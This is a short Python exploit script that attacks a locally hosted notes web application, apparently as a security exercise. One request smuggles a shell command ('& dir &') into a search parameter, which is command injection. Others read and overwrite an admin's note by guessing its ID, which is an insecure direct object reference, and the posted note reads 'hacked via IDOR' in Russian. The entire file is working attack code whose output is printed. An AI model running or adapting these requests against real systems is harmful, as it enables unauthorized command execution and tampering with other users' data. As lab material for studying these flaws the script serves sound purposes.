import requests

URL = "http://127.0.0.1:5000"


def injection():
    requests.post(URL + "/", data={"title": "test"})
    t1 = 'test" notes_log.txt & dir & "'
    exp1 = requests.get(URL + "/search", params={"q": t1})
    print(exp1.text)

def idor():
    admin_note_id = 1
    exp2 = requests.get(URL + "/note", params={"id": admin_note_id})
    print(exp2.text)
    exp3 = requests.post(URL + "/note", params={"id": admin_note_id}, data={"text": "ВЗЛОМАНО через IDOR"})
    print(exp3.text)

if __name__ == "__main__":
    injection()
    idor()